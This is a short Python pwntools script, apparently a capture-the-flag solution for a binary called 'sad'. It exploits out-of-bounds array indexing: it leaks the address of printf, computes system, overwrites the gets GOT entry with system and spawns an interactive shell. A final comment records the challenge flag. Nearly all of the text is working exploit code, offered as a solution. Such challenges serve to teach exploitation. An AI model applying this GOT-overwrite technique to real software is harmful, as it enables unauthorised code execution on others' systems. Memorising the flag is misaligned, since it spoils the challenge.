from pwn import *
import struct

p64 = lambda x : struct.pack("Q",x)
u64 = lambda x : struct.unpack("Q",x)[0]
elf = ELF("sad")
r = elf.process()

#leak printf
r.sendline("1")
r.recv()
r.sendline("-11")
r.recvuntil("]: ")
printf = u64(r.recv(6).ljust(8,b"\x00"))
system = printf - 0xf980
log.info(f"printf @ {hex(printf)}")
log.info(f"system @ {hex(system)}")

#overwrite an entry with /bin/sh
r.sendline("2")
r.sendline("1")
r.sendline("/bin/sh")

#overwrite gets got with system
r.sendline("2")
r.sendline("-10")
r.sendline(p64(system))

# call system("/bin/sh")
r.sendline("2")
input()
r.sendline("1")
r.interactive()

# cat flag -> sctf{4rr4y_00b5_4r3_d4ng3rou5}
